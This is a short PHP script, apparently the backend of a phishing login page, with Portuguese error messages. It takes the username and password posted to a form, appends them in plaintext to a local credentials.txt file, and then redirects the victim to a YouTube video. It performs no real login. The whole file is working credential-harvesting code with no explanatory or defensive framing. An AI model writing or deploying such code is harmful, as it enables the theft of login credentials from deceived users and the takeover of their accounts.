<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";
    $filePath = __DIR__ . '/credentials.txt';
    
    $result = file_put_contents($filePath, $data, FILE_APPEND | LOCK_EX);
    if ($result === false) {
        error_log("Erro ao escrever em $filePath");
        echo "Ocorreu um erro ao salvar as credenciais.";
        exit;
    }
    
    header("Location: https://www.youtube.com/shorts/m5-8zmoXaQA");
    exit;
}
?>
